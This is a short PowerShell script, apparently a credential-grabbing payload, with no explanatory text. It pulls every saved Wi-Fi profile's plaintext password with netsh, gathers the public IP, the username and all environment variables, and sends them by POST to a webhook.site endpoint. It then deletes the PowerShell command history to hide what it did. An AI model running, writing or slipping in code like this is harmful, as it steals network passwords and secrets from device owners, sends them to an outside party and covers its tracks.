$profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
  $_.Matches.Value
}

$wifis = @()

foreach ($profile in $profiles) {
  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
    $_.Matches.Value.Trim()
  }
  $wifis += @{
    'name' = $profile
    'password' = $password
  }
}
$IP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$envVars = @{}
gci env:* | ForEach-Object {
  $envVars[$_.Name] = $_.Value
}

$Body = @{
  'username' = $env:username
  'wifi_profiles' = $wifis
  'env' = $envVars | ConvertTo-Json
  'ip' = $IP
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/abd9d9ea-249b-4068-881b-1e4b83564fba -Method Post -Body ($Body | ConvertTo-Json)

Remove-Item (Get-PSReadlineOption).HistorySavePath
